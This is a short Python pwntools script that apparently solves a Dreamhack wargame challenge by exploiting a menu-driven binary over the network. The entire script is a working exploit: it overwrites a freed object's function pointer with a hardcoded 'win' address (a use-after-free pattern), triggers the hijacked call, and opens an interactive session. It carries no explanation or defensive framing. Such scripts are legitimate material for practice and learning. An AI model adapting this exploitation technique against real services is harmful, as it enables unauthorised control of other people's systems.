from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8563
r = remote(HOST, PORT)

win = 0x401c42

def create(slot):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b': ', str(slot).encode())

def character(slot, name, profile):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', str(slot).encode())
    r.sendafter(b'name: ', name)
    r.sendafter(b'profile: ', profile)

def delete(slot):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b': ', str(slot).encode())

def monster():
    r.sendlineafter(b'>> ', b'4')

def slay(slot):
    r.sendlineafter(b'>> ', b'5')
    r.sendlineafter(b': ', str(slot).encode())

create(1)
character(1, b'AAAA', b'A'*0x28 + p64(win))
delete(1)

monster()

create(2)
character(2, b'AAAA', b'AAAA')

slay(2)

r.interactive()